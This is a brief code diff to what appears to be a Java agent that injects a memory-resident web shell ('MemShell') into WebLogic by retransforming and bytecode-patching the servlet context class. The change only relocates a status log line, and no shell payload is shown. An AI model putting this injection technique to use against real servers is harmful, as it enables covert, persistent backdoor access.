@@ -40,7 +40,6 @@ public class WebLogicServletContextAgentInjector implements ClassFileTransformer
             String name = allLoadedClass.getName();
             if (TARGET_CLASS.replace("/", ".").equals(name)) {
                 inst.retransformClasses(allLoadedClass);
-                System.out.println("MemShell Agent is working at weblogic.servlet.internal.WebAppServletContext.securedExecute");
             }
         }
     }
@@ -61,6 +60,7 @@ public class WebLogicServletContextAgentInjector implements ClassFileTransformer
                 };
                 ClassVisitor cv = getClassVisitor(cw);
                 cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                System.out.println("MemShell Agent is working at " + TARGET_CLASS.replace("/", ".") + "." + TARGET_METHOD_NAME);
                 return cw.toByteArray();
             } catch (Exception e) {
                 e.printStackTrace();
